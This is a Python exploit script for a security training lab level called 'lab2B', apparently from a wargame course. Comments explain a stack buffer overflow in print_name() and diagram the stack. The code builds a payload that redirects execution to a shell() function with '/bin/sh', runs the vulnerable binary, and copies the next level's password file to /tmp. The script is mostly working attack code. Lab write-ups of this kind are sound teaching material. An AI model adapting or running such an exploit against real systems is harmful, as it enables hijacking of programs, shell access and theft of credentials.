#!/usr/bin/python
# coding: utf-8


'''
Exploit for level lab2B
'''

import os
import struct


#   Behaviour: This level takes a single argument in the command line options.
# It passes the string to a function print_name() and then copies it into a
# local buffer (dest). Last, prints the string with a Hello message.

#   Observations: There is a buffer overflow bug in print_name(), we can use
# it to gain control of the eip register by overwriting the return address.
# There is a function located in 0x080486bd which makes a system call to
# the command we speciy as an argument.

#   Exploit: Our goal to successfully exploit this level is to craft a string
# that when copied into the local buffer, overflows and overwrites the return
# address with the address of the shell() function and places the string
# "/bin/sh" as an argument to that function.


# The stack in print_name() will look something like this:
#
#    ebp-0x28 +---------------------------+ esp       --> VALUES TO OVERWRITE
#             |             .             |
#             |             .             |
#             |             .             |
#    ebp-0x17 +---------------------------+ esp+0x11  (begining of dest)
#             |                           |           --> 4 bytes of padding
#    ebp-0x14 +---------------------------+ esp+0x14
#             |                           |           --> 4 bytes of padding
#    ebp-0x10 +---------------------------+ esp+0x18
#             |             .             |           --> more padding
#             |             .             |           --> more padding
#             |             .             |           --> more padding
#     ebp+0x4 +---------------------------+ esp+0x2c  (Shell() new ebp)
#             |       return address      |           --> 0x080486bd
#     ebp+0x8 +---------------------------+ esp+0x30
#             |   pointer to our string   |           --> 4 bytes of padding
#     ebp+0xc +---------------------------+ esp+0x34  (Shell() ebp+0x8)
#             |                           |           --> pointer to "/bin/sh"
#    ebp+0x10 +---------------------------+ esp+0x38
#             |                           |
#                          ...

# Now that we know the stack layout, we can craft our string
crafted = "A" * 0x1b + struct.pack('<I', 0x080486bd)  # Padding + shell() addr

# There is a pointer to "/bin/sh" in 0x80487d0 (in .rodata section)
crafted += "A" * 4 + struct.pack('<I', 0x80487d0)  # Padding + /bin/sh pointer

cmd = '$(python -c \'print "%s"\')' % crafted
os.system('echo "cat /home/lab2A/.pass > /tmp/lab2A.pass" | ' +
          '/levels/lab02/lab2B %s' % cmd)
print '[+] Password saved in /tmp/lab2A.pass'
